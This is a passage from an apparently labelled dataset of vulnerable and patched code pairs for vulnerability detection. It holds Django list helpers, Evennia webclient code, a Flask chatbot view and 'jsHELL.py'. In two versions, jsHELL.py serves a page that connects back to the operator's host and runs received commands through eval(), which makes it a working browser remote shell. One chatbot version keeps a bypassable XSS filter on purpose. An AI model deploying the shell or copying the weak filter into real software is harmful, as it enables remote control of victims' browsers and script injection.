 except FieldDoesNotExist:\n            self.model_field = None\n            try:\n                field = getattr(self.model, self.field_name)\n                if callable(field) and getattr(field, 'admin_order_field', False):\n                    self.order_field = getattr(field, 'admin_order_field')\n                if callable(field) and getattr(field, 'alters_data', False):\n                    raise SmartListException(\"Cannot use a function that alters data in smart list\")\n            except AttributeError:\n                self.order_field = self.field_name\n                pass  # This is most likely a .values() query set\n\n        if self.order_field:\n            self.order = SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param)\n\n\nclass SmartFilterValue(QueryParamsMixin, object):\n    def __init__(self, field_name, label, value, query_params):\n        self.field_name = field_name\n        self.label = label\n        self.value = value\n        self.query_params = query_params\n\n    def get_title(self):\n        return self.label\n\n    def get_url(self):\n        return self.get_url_with_query_params({\n            self.field_name: self.value\n        })\n\n    def is_active(self):\n        if self.field_name in self.query_params:\n            selected_value = self.query_params[self.field_name]\n            if type(selected_value) == list:\n                selected_value = selected_value[0]\n            if selected_value == self.value:\n                return True\n        elif self.value is None:\n            return True\n        return False\n\n\nclass SmartFilter(TitleFromModelFieldMixin, object):\n    def __init__(self, model, field, query_params, object_list):\n        self.model = model\n\n        # self.model_field = None\n        if isinstance(field, SmartListFilter):\n            self.field_name = field.parameter_name\n            self.model_field = field\n        else:\n            self.field_name = field\n            self.model_field = self.model._meta.get_field(self.field_name)\n        self.query_params = query_params\n        self.object_list = object_list\n\n    def get_title(self):\n        if isinstance(self.model_field, SmartListFilter):\n            return self.model_field.title\n        return super(SmartFilter, self).get_title()\n\n    def get_values(self):\n        values = []\n        if isinstance(self.model_field, SmartListFilter):\n            values = [\n                SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups()\n            ]\n        elif self.model_field.choices:\n            values = [\n                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices\n            ]\n        elif type(self.model_field) == BooleanField:\n            values = [\n                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in (\n                    (1, _('Yes')),\n                    (0, _('No'))\n                )\n            ]\n        elif issubclass(type(self.model_field), ForeignKey):\n            pks = self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True)\n            remote_field = self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field\n            qs = remote_field.model.objects.filter(pk__in=pks)\n            values = [\n                SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs\n            ]\n\n        return [SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] + values\n\n\nclass SmartList(object):\n    def __init__(self, object_list, query_params=None, list_display=None, list_filter=None,\n                 list_search=None, search_query_param=None, ordering_query_param=None):\n        self.object_list = object_list\n        self.model = object_list.model\n        self.query_params = query_params or {}\n        self.list_display = list_display or []\n        self.list_filter = list_filter or []\n        self.list_search = list_search or []\n        self.search_query_value = self.query_params.get(search_query_param, '')\n        self.search_query_param = search_query_param\n        self.ordering_query_value = self.query_params.get(ordering_query_param, '')\n        self.ordering_query_param = ordering_query_param\n\n        self.columns = self.get_columns()\n\n        self.filters = [\n            SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1)\n        ] if self.list_filter else []\n\n    def get_columns(self):  # type: () -> List[SmartColumn]\n        \"\"\"\n        Transform list_display into list of SmartColumns\n        In list_display we expect:\n         1. name of the field (string)\n         or\n         2. two element iterable in which:\n            - first element is name of the field (string) or callable\n              which returns html\n            - label for the column (string)\n        \"\"\"\n\n        if not self.list_display:\n            return [SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)]\n\n        columns = []\n        for index, field in enumerate(self.list_display, start=1):\n            kwargs = {\n                'model': self.model,\n                'column_id': index,\n                'query_params': self.query_params,\n                'ordering_query_param': self.ordering_query_param,\n            }\n\n            try:\n                field, label = field\n            except (TypeError, ValueError):\n                kwargs['field'] = field\n            else:\n                if callable(field):\n                    kwargs['field'], kwargs['render_function'], kwargs['label'] = None, field, label\n                else:\n                    kwargs['field'], kwargs['label'] = field, label\n            columns.append(SmartColumn(**kwargs))\n        return columns\n\n    @property\n    def items(self):\n        return [\n            SmartListItem(self, obj) for obj in self.object_list\n        ]\n/n/n/n", "label": 0}, {"id": "44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3", "code": "/smart_lists/helpers.py/n/nimport datetime\n\nfrom django.core.exceptions import FieldDoesNotExist\nfrom django.db.models import BooleanField, ForeignKey\nfrom django.utils.formats import localize\nfrom django.utils.html import format_html, escape\nfrom django.utils.http import urlencode\nfrom django.utils.translation import gettext_lazy as _\nfrom typing import List\n\nfrom smart_lists.exceptions import SmartListException\nfrom smart_lists.filters import SmartListFilter\n\n\nclass TitleFromModelFieldMixin(object):\n    def get_title(self):\n        if self.label:\n            return self.label\n        elif self.model_field:\n            return self.model_field.verbose_name.title()\n        elif self.field_name == '__str__':\n            return self.model._meta.verbose_name.title()\n        try:\n            field = getattr(self.model, self.field_name)\n        except AttributeError as e:\n            return self.field_name.title()\n        if callable(field) and getattr(field, 'short_description', False):\n            return field.short_description\n        return self.field_name.replace(\"_\", \" \").title()\n\n\nclass QueryParamsMixin(object):\n    def get_url_with_query_params(self, new_query_dict):\n        query = dict(self.query_params).copy()\n        for key, value in query.items():\n            if type(value) == list:\n                query[key] = value[0]\n        query.update(new_query_dict)\n        for key, value in query.copy().items():\n            if value is None:\n                del query[key]\n        return '?{}'.format(urlencode(query))\n\n\nclass SmartListField(object):\n    def __init__(self, smart_list_item, column, object):\n        self.smart_list_item = smart_list_item\n        self.column = column\n        self.object = object\n\n    def get_value(self):\n        if self.column.render_function:\n            # We don't want to escape our html\n            return self.column.render_function(self.object)\n\n        field = getattr(self.object, self.column.field_name) if self.column.field_name else None\n        if type(self.object) == dict:\n            value = self.object.get(self.column.field_name)\n        elif callable(field):\n            value = field() if getattr(field, 'do_not_call_in_templates', False) else field\n        else:\n            display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)\n            value = display_function() if display_function else field\n\n        return escape(value)\n\n    def format(self, value):\n        if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):\n            return localize(value)\n        return value\n\n    def render(self):\n        return format_html(\n            '<td>{}</td>', self.format(self.get_value())\n        )\n\n    def render_link(self):\n        if not hasattr(self.object, 'get_absolute_url'):\n            raise SmartListException(\"Please make sure your model {} implements get_absolute_url()\".format(type(self.object)))\n        return format_html(\n            '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value())\n        )\n\n\nclass SmartListItem(object):\n    def __init__(self, smart_list, object):\n        self.smart_list = smart_list\n        self.object = object\n\n    def fields(self):\n        return [\n            SmartListField(self, column, self.object) for column in self.smart_list.columns\n        ]\n\n\nclass SmartOrder(QueryParamsMixin, object):\n    def __init__(self, query_params, column_id, ordering_query_param):\n        self.query_params = query_params\n        self.column_id = column_id\n        self.ordering_query_param = ordering_query_param\n        self.query_order = query_params.get(ordering_query_param)\n        self.current_columns = [int(col) for col in self.query_order.replace(\"-\", \"\").split(\".\")] if self.query_order else []\n        self.current_columns_length = len(self.current_columns)\n\n    @property\n    def priority(self):\n        if self.is_ordered():\n            return self.current_columns.index(self.column_id) + 1\n\n    def is_ordered(self):\n        return self.column_id in self.current_columns\n\n    def is_reverse(self):\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if int(c) == self.column_id:\n                if column.startswith(\"-\"):\n                    return True\n        return False\n\n    def get_add_sort_by(self):\n        if not self.is_ordered():\n            if self.query_order:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order)\n                })\n            else:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: self.column_id\n                })\n        elif self.current_columns_length > 1:\n            new_query = []\n            for column in self.query_order.split('.'):\n                c = column.replace(\"-\", \"\")\n                if not int(c) == self.column_id:\n                    new_query.append(column)\n            if not self.is_reverse() and self.current_columns[0] == self.column_id:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query))\n                })\n            else:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '{}.{}'.format(self.column_id, \".\".join(new_query))\n                })\n\n        else:\n            return self.get_reverse_sort_by()\n\n    def get_remove_sort_by(self):\n        new_query = []\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if not int(c) == self.column_id:\n                new_query.append(column)\n        return self.get_url_with_query_params({\n            self.ordering_query_param: \".\".join(new_query)\n        })\n\n    def get_reverse_sort_by(self):\n        new_query = []\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if int(c) == self.column_id:\n                if column.startswith(\"-\"):\n                    new_query.append(c)\n                else:\n                    new_query.append('-{}'.format(c))\n            else:\n                new_query.append(column)\n\n        return self.get_url_with_query_params({\n            self.ordering_query_param: \".\".join(new_query)\n        })\n\n\nclass SmartColumn(TitleFromModelFieldMixin, object):\n    def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None):\n        self.model = model\n        self.field_name = field\n        self.label = label\n        self.render_function = render_function\n        self.order_field = None\n        self.order = None\n\n        # If there is no field_name that means it is not bound to any model field\n        if not self.field_name:\n            return\n\n        if self.field_name.startswith(\"_\") and self.field_name != \"__str__\":\n            raise SmartListException(\"Cannot use underscore(_) variables/functions in smart lists\")\n        try:\n            self.model_field = self.model._meta.get_field(self.field_name)\n            self.order_field = self.field_name\n        except FieldDoesNotExist:\n            self.model_field = None\n            try:\n                field = getattr(self.model, self.field_name)\n                if callable(field) and getattr(field, 'admin_order_field', False):\n                    self.order_field = getattr(field, 'admin_order_field')\n                if callable(field) and getattr(field, 'alters_data', False):\n                    raise SmartListException(\"Cannot use a function that alters data in smart list\")\n            except AttributeError:\n                self.order_field = self.field_name\n                pass  # This is most likely a .values() query set\n\n        if self.order_field:\n            self.order = SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param)\n\n\nclass SmartFilterValue(QueryParamsMixin, object):\n    def __init__(self, field_name, label, value, query_params):\n        self.field_name = field_name\n        self.label = label\n        self.value = value\n        self.query_params = query_params\n\n    def get_title(self):\n        return self.label\n\n    def get_url(self):\n        return self.get_url_with_query_params({\n            self.field_name: self.value\n        })\n\n    def is_active(self):\n        if self.field_name in self.query_params:\n            selected_value = self.query_params[self.field_name]\n            if type(selected_value) == list:\n                selected_value = selected_value[0]\n            if selected_value == self.value:\n                return True\n        elif self.value is None:\n            return True\n        return False\n\n\nclass SmartFilter(TitleFromModelFieldMixin, object):\n    def __init__(self, model, field, query_params, object_list):\n        self.model = model\n\n        # self.model_field = None\n        if isinstance(field, SmartListFilter):\n            self.field_name = field.parameter_name\n            self.model_field = field\n        else:\n            self.field_name = field\n            self.model_field = self.model._meta.get_field(self.field_name)\n        self.query_params = query_params\n        self.object_list = object_list\n\n    def get_title(self):\n        if isinstance(self.model_field, SmartListFilter):\n            return self.model_field.title\n        return super(SmartFilter, self).get_title()\n\n    def get_values(self):\n        values = []\n        if isinstance(self.model_field, SmartListFilter):\n            values = [\n                SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups()\n            ]\n        elif self.model_field.choices:\n            values = [\n                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices\n            ]\n        elif type(self.model_field) == BooleanField:\n            values = [\n                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in (\n                    (1, _('Yes')),\n                    (0, _('No'))\n                )\n            ]\n        elif issubclass(type(self.model_field), ForeignKey):\n            pks = self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True)\n            remote_field = self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field\n            qs = remote_field.model.objects.filter(pk__in=pks)\n            values = [\n                SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs\n            ]\n\n        return [SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] + values\n\n\nclass SmartList(object):\n    def __init__(self, object_list, query_params=None, list_display=None, list_filter=None,\n                 list_search=None, search_query_param=None, ordering_query_param=None):\n        self.object_list = object_list\n        self.model = object_list.model\n        self.query_params = query_params or {}\n        self.list_display = list_display or []\n        self.list_filter = list_filter or []\n        self.list_search = list_search or []\n        self.search_query_value = self.query_params.get(search_query_param, '')\n        self.search_query_param = search_query_param\n        self.ordering_query_value = self.query_params.get(ordering_query_param, '')\n        self.ordering_query_param = ordering_query_param\n\n        self.columns = self.get_columns()\n\n        self.filters = [\n            SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1)\n        ] if self.list_filter else []\n\n    def get_columns(self):  # type: () -> List[SmartColumn]\n        \"\"\"\n        Transform list_display into list of SmartColumns\n        In list_display we expect:\n         1. name of the field (string)\n         or\n         2. two element iterable in which:\n            - first element is name of the field (string) or callable\n              which returns html\n            - label for the column (string)\n        \"\"\"\n\n        if not self.list_display:\n            return [SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)]\n\n        columns = []\n        for index, field in enumerate(self.list_display, start=1):\n            kwargs = {\n                'model': self.model,\n                'column_id': index,\n                'query_params': self.query_params,\n                'ordering_query_param': self.ordering_query_param,\n            }\n\n            try:\n                field, label = field\n            except (TypeError, ValueError):\n                kwargs['field'] = field\n            else:\n                if callable(field):\n                    kwargs['field'], kwargs['render_function'], kwargs['label'] = None, field, label\n                else:\n                    kwargs['field'], kwargs['label'] = field, label\n            columns.append(SmartColumn(**kwargs))\n        return columns\n\n    @property\n    def items(self):\n        return [\n            SmartListItem(self, obj) for obj in self.object_list\n        ]\n/n/n/n", "label": 1}, {"id": "88448ebe525815e97ee6724c428be88a638b5bb6", "code": "jsHELL.py/n/nfrom flask_socketio import SocketIO,emit\nfrom flask import Flask\nimport sys\n\nif len(sys.argv)<3:\n    print \"Usage : python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\"\n    exit()\n\nPORT=sys.argv[2].strip()\nHOST=sys.argv[1].strip()\n\nprint \"Listening on\",HOST+\":\"+PORT\n\napp = Flask(__name__)\napp.secret_key='I Am Batman.'\naccess_key=\"Tony Stark Is The Best.\"\nsession_id=\"This guy fucks!\"\nsocketio = SocketIO(app)\n\nhtml='''\n<div id=history></div>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script>\n\n<script>\n'''    \nhtml=html+\"var socket = io.connect('http://{}:{}');\".format(HOST,PORT)\n\nhtml=html+'''\n    try{setTimeout(`\n            socket.emit('sendMSG','Connection Established.')\n        `,1000)\n     }\n\n    catch{}\n\n    socket.on('getMSG',function(data){\n        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data.replace(/</g,\"\")+\"]</font>\";\n        try{\n             output=eval(data)+\"\"\n        }\n        catch(e){\n            output=e+\"\"\n        }\n        socket.emit('sendMSG',output)\n    })\n</script>\n'''\n\n@app.route('/',methods = ['GET'])\ndef shell():\n    return html\n\n@socketio.on('sendMSG')\ndef sendMSG(message): #Get MSG from Client\n    print(\"OUTPUT> \"+str(message))\n    command=raw_input(\"CMD> \")\n    emit(\"getMSG\",command+\"\\n\")\n    if command==\"exit\":\n        exit()\n\nif __name__ == '__main__':\n   socketio.run(app,debug=True,host=HOST,port=int(PORT))\n\n/n/n/n", "label": 0}, {"id": "88448ebe525815e97ee6724c428be88a638b5bb6", "code": "/jsHELL.py/n/nfrom flask_socketio import SocketIO,emit\nfrom flask import Flask, render_template, session,request,flash,redirect,url_for\nimport sys\n\nif len(sys.argv)<3:\n    print \"Usage : python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\"\n    exit()\n\nPORT=sys.argv[2].strip()\nHOST=sys.argv[1].strip()\n\nprint \"Listening on\",HOST+\":\"+PORT\n\napp = Flask(__name__)\napp.secret_key='I Am Batman.'\naccess_key=\"Tony Stark Is The Best.\"\nsession_id=\"This guy fucks!\"\nsocketio = SocketIO(app)\n\nhtml='''\n<div id=history></div>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script>\n\n<script>\n'''    \nhtml=html+\"var socket = io.connect('http://{}:{}');\".format(HOST,PORT)\n\nhtml=html+'''\n    try{setTimeout(`\n            socket.emit('sendMSG','Connection Established.')\n        `,1000)\n     }\n\n    catch{}\n\n    socket.on('getMSG',function(data){\n        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";\n        try{\n             output=eval(data)+\"\"\n        }\n        catch(e){\n            output=e+\"\"\n        }\n        socket.emit('sendMSG',output)\n    })\n</script>\n'''\n\n@app.route('/',methods = ['GET'])\ndef shell():\n    return html\n\n@socketio.on('sendMSG')\ndef sendMSG(message): #Get MSG from Client\n    print(\"OUTPUT> \"+str(message))\n    command=raw_input(\"CMD> \")\n    emit(\"getMSG\",command+\"\\n\")\n    if command==\"exit\":\n        exit()\n\nif __name__ == '__main__':\n   socketio.run(app,debug=True,host=HOST,port=int(PORT))\n\n/n/n/n", "label": 1}, {"id": "59156d7040f96c076421414bce17ae96a970cd3a", "code": "squiggle_xss/app/squiggle_patch/main/views.py/n/n#!/usr/bin/env python3\nimport random\nimport html # for counter-xss escaping\n\nfrom flask import url_for, redirect, render_template, request\n\nfrom . import bp as app  # Note that app = blueprint, current_app = flask context\n\n\n@app.route(\"/\")\ndef root():\n\treturn render_template(\"home.html\")\n\n@app.route(\"/interact\", methods=[\"POST\"])\ndef vuln():\n\t#msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n\t# replace approach is no good\n\tmsg = html.escape(request.form[\"message\"])\n\t\n\tresponses = [\n\t\t\"send help\",\n\t\t\"what is my purpose\",\n\t\t\"donate to us via bitcoin at: {{ bitcoin_address }}\",\n\t\t\"donate to us via paypal at: {{ paypal_address }}\",\n\t\t\"donate to us via venmo at: {{ venmo_address }}\",\n\t\t\"donate to us via beemit at: {{ beemit_address }}\",\n\t]\n\n\treturn render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n/n/n/n", "label": 0}, {"id": "59156d7040f96c076421414bce17ae96a970cd3a", "code": "/squiggle_xss/app/squiggle_patch/main/views.py/n/n#!/usr/bin/env python3\nimport random\n\nfrom flask import url_for, redirect, render_template, request\n\nfrom . import bp as app  # Note that app = blueprint, current_app = flask context\n\n\n@app.route(\"/\")\ndef root():\n    return render_template(\"home.html\")\n\n\n@app.route(\"/interact\", methods=[\"POST\"])\ndef vuln():\n    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n    responses = [\n        \"send help\",\n        \"what is my purpose\",\n        \"donate to us via bitcoin at: {{ bitcoin_address }}\",\n        \"donate to us via paypal at: {{ paypal_address }}\",\n        \"donate to us via venmo at: {{ venmo_address }}\",\n        \"donate to us via beemit at: {{ beemit_address }}\",\n    ]\n\n    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n/n/n/n", "label": 1}, {"id": "300261529b82f95414c9d1d7150d6eda4695bb93", "code": "evennia/server/portal/webclient_ajax.py/n/n\"\"\"\nAJAX/COMET fallback webclient\n\nThe AJAX/COMET web client consists of two components running on\ntwisted and django. They are both a part of the Evennia website url\ntree (so the testing website might be located on\nhttp://localhost:4001/, whereas the webclient can be found on\nhttp://localhost:4001/webclient.)\n\n/webclient - this url is handled through django's template\n             system and serves the html page for the client\n             itself along with its javascript chat program.\n/webclientdata - this url is called by the ajax chat using\n                 POST requests (long-polling when necessary)\n                 The WebClient resource in this module will\n                 handle these requests and act as a gateway\n                 to sessions connected over the webclient.\n\"\"\"\nimport json\nimport re\nimport time\nimport cgi\n\nfrom twisted.web import server, resource\nfrom twisted.internet.task import LoopingCall\nfrom django.utils.functional import Promise\nfrom django.utils.encoding import force_unicode\nfrom django.conf import settings\nfrom evennia.utils.ansi import parse_ansi\nfrom evennia.utils import utils\nfrom evennia.utils.text2html import parse_html\nfrom evennia.server import session\n\n_CLIENT_SESSIONS = utils.mod_import(settings.SESSION_ENGINE).SessionStore\n_RE_SCREENREADER_REGEX = re.compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL + re.MULTILINE)\n_SERVERNAME = settings.SERVERNAME\n_KEEPALIVE = 30  # how often to check keepalive\n\n\n# defining a simple json encoder for returning\n# django data to the client. Might need to\n# extend this if one wants to send more\n# complex database objects too.\n\nclass LazyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, Promise):\n            return force_unicode(obj)\n        return super(LazyEncoder, self).default(obj)\n\n\ndef jsonify(obj):\n    return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder))\n\n\n#\n# AjaxWebClient resource - this is called by the ajax client\n# using POST requests to /webclientdata.\n#\n\nclass AjaxWebClient(resource.Resource):\n    \"\"\"\n    An ajax/comet long-polling transport\n\n    \"\"\"\n    isLeaf = True\n    allowedMethods = ('POST',)\n\n    def __init__(self):\n        self.requests = {}\n        self.databuffer = {}\n\n        self.last_alive = {}\n        self.keep_alive = None\n\n    def _responseFailed(self, failure, csessid, request):\n        \"callback if a request is lost/timed out\"\n        try:\n            del self.requests[csessid]\n        except KeyError:\n            # nothing left to delete\n            pass\n\n    def _keepalive(self):\n        \"\"\"\n        Callback for checking the connection is still alive.\n        \"\"\"\n        now = time.time()\n        to_remove = []\n        keep_alives = ((csessid, remove) for csessid, (t, remove)\n                       in self.last_alive.iteritems() if now - t > _KEEPALIVE)\n        for csessid, remove in keep_alives:\n            if remove:\n                # keepalive timeout. Line is dead.\n                to_remove.append(csessid)\n            else:\n                # normal timeout - send keepalive\n                self.last_alive[csessid] = (now, True)\n                self.lineSend(csessid, [\"ajax_keepalive\", [], {}])\n        # remove timed-out sessions\n        for csessid in to_remove:\n            sessions = self.sessionhandler.sessions_from_csessid(csessid)\n            for sess in sessions:\n                sess.disconnect()\n            self.last_alive.pop(csessid, None)\n            if not self.last_alive:\n                # no more ajax clients. Stop the keepalive\n                self.keep_alive.stop()\n                self.keep_alive = None\n\n    def at_login(self):\n        \"\"\"\n        Called when this session gets authenticated by the server.\n        \"\"\"\n        pass\n\n    def lineSend(self, csessid, data):\n        \"\"\"\n        This adds the data to the buffer and/or sends it to the client\n        as soon as possible.\n\n        Args:\n            csessid (int): Session id.\n            data (list): A send structure [cmdname, [args], {kwargs}].\n\n        \"\"\"\n        request = self.requests.get(csessid)\n        if request:\n            # we have a request waiting. Return immediately.\n            request.write(jsonify(data))\n            request.finish()\n            del self.requests[csessid]\n        else:\n            # no waiting request. Store data in buffer\n            dataentries = self.databuffer.get(csessid, [])\n            dataentries.append(jsonify(data))\n            self.databuffer[csessid] = dataentries\n\n    def client_disconnect(self, csessid):\n        \"\"\"\n        Disconnect session with given csessid.\n\n        Args:\n            csessid (int): Session id.\n\n        \"\"\"\n        if csessid in self.requests:\n            self.requests[csessid].finish()\n            del self.requests[csessid]\n        if csessid in self.databuffer:\n            del self.databuffer[csessid]\n\n    def mode_init(self, request):\n        \"\"\"\n        This is called by render_POST when the client requests an init\n        mode operation (at startup)\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = cgi.escape(request.args['csessid'][0])\n\n        remote_addr = request.getClientIP()\n        host_string = \"%s (%s:%s)\" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)\n\n        sess = AjaxWebClientSession()\n        sess.client = self\n        sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler)\n\n        sess.csessid = csessid\n        csession = _CLIENT_SESSIONS(session_key=sess.csessid)\n        uid = csession and csession.get(\"webclient_authenticated_uid\", False)\n        if uid:\n            # the client session is already logged in\n            sess.uid = uid\n            sess.logged_in = True\n\n        sess.sessionhandler.connect(sess)\n\n        self.last_alive[csessid] = (time.time(), False)\n        if not self.keep_alive:\n            # the keepalive is not running; start it.\n            self.keep_alive = LoopingCall(self._keepalive)\n            self.keep_alive.start(_KEEPALIVE, now=False)\n\n        return jsonify({'msg': host_string, 'csessid': csessid})\n\n    def mode_keepalive(self, request):\n        \"\"\"\n        This is called by render_POST when the\n        client is replying to the keepalive.\n        \"\"\"\n        csessid = cgi.escape(request.args['csessid'][0])\n        self.last_alive[csessid] = (time.time(), False)\n        return '\"\"'\n\n    def mode_input(self, request):\n        \"\"\"\n        This is called by render_POST when the client\n        is sending data to the server.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = cgi.escape(request.args['csessid'][0])\n        self.last_alive[csessid] = (time.time(), False)\n        sess = self.sessionhandler.sessions_from_csessid(csessid)\n        if sess:\n            sess = sess[0]\n            cmdarray = json.loads(cgi.escape(request.args.get('data')[0]))\n            sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})\n        return '\"\"'\n\n    def mode_receive(self, request):\n        \"\"\"\n        This is called by render_POST when the client is telling us\n        that it is ready to receive data as soon as it is available.\n        This is the basis of a long-polling (comet) mechanism: the\n        server will wait to reply until data is available.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = cgi.escape(request.args['csessid'][0])\n        self.last_alive[csessid] = (time.time(), False)\n\n        dataentries = self.databuffer.get(csessid, [])\n        if dataentries:\n            return dataentries.pop(0)\n        request.notifyFinish().addErrback(self._responseFailed, csessid, request)\n        if csessid in self.requests:\n            self.requests[csessid].finish()  # Clear any stale request.\n        self.requests[csessid] = request\n        return server.NOT_DONE_YET\n\n    def mode_close(self, request):\n        \"\"\"\n        This is called by render_POST when the client is signalling\n        that it is about to be closed.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = cgi.escape(request.args['csessid'][0])\n        try:\n            sess = self.sessionhandler.sessions_from_csessid(csessid)[0]\n            sess.sessionhandler.disconnect(sess)\n        except IndexError:\n            self.client_disconnect(csessid)\n        return '\"\"'\n\n    def render_POST(self, request):\n        \"\"\"\n        This function is what Twisted calls with POST requests coming\n        in from the ajax client. The requests should be tagged with\n        different modes depending on what needs to be done, such as\n        initializing or sending/receving data through the request. It\n        uses a long-polling mechanism to avoid sending data unless\n        there is actual data available.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        dmode = request.args.get('mode', [None])[0]\n\n        if dmode == 'init':\n            # startup. Setup the server.\n            return self.mode_init(request)\n        elif dmode == 'input':\n            # input from the client to the server\n            return self.mode_input(request)\n        elif dmode == 'receive':\n            # the client is waiting to receive data.\n            return self.mode_receive(request)\n        elif dmode == 'close':\n            # the client is closing\n            return self.mode_close(request)\n        elif dmode == 'keepalive':\n            # A reply to our keepalive request - all is well\n            return self.mode_keepalive(request)\n        else:\n            # This should not happen if client sends valid data.\n            return '\"\"'\n\n\n#\n# A session type handling communication over the\n# web client interface.\n#\n\nclass AjaxWebClientSession(session.Session):\n    \"\"\"\n    This represents a session running in an AjaxWebclient.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        self.protocol_key = \"webclient/ajax\"\n        super(AjaxWebClientSession, self).__init__(*args, **kwargs)\n\n    def get_client_session(self):\n        \"\"\"\n        Get the Client browser session (used for auto-login based on browser session)\n\n        Returns:\n            csession (ClientSession): This is a django-specific internal representation\n                of the browser session.\n\n        \"\"\"\n        if self.csessid:\n            return _CLIENT_SESSIONS(session_key=self.csessid)\n\n    def disconnect(self, reason=\"Server disconnected.\"):\n        \"\"\"\n        Disconnect from server.\n\n        Args:\n            reason (str): Motivation for the disconnect.\n        \"\"\"\n        csession = self.get_client_session()\n\n        if csession:\n            csession[\"webclient_authenticated_uid\"] = None\n            csession.save()\n            self.logged_in = False\n        self.client.lineSend(self.csessid, [\"connection_close\", [reason], {}])\n        self.client.client_disconnect(self.csessid)\n        self.sessionhandler.disconnect(self)\n\n    def at_login(self):\n        csession = self.get_client_session()\n        if csession:\n            csession[\"webclient_authenticated_uid\"] = self.uid\n            csession.save()\n\n    def data_out(self, **kwargs):\n        \"\"\"\n        Data Evennia -> User\n\n        Kwargs:\n            kwargs (any): Options to the protocol\n        \"\"\"\n        self.sessionhandler.data_out(self, **kwargs)\n\n    def send_text(self, *args, **kwargs):\n        \"\"\"\n        Send text data. This will pre-process the text for\n        color-replacement, conversion to html etc.\n\n        Args:\n            text (str): Text to send.\n\n        Kwargs:\n            options (dict): Options-dict with the following keys understood:\n                - raw (bool): No parsing at all (leave ansi-to-html markers unparsed).\n                - nocolor (bool): Remove all color.\n                - screenreader (bool): Use Screenreader mode.\n                - send_prompt (bool): Send a prompt with parsed html\n\n        \"\"\"\n        if args:\n            args = list(args)\n            text = args[0]\n            if text is None:\n                return\n        else:\n            return\n\n        flags = self.protocol_flags\n        text = utils.to_str(text, force_string=True)\n\n        options = kwargs.pop(\"options\", {})\n        raw = options.get(\"raw\", flags.get(\"RAW\", False))\n        xterm256 = options.get(\"xterm256\", flags.get('XTERM256', True))\n        useansi = options.get(\"ansi\", flags.get('ANSI', True))\n        nocolor = options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not (xterm256 or useansi))\n        screenreader = options.get(\"screenreader\", flags.get(\"SCREENREADER\", False))\n        prompt = options.get(\"send_prompt\", False)\n\n        if screenreader:\n            # screenreader mode cleans up output\n            text = parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False)\n            text = _RE_SCREENREADER_REGEX.sub(\"\", text)\n        cmd = \"prompt\" if prompt else \"text\"\n        if raw:\n            args[0] = text\n        else:\n            args[0] = parse_html(text, strip_ansi=nocolor)\n\n        # send to client on required form [cmdname, args, kwargs]\n        self.client.lineSend(self.csessid, [cmd, args, kwargs])\n\n    def send_prompt(self, *args, **kwargs):\n        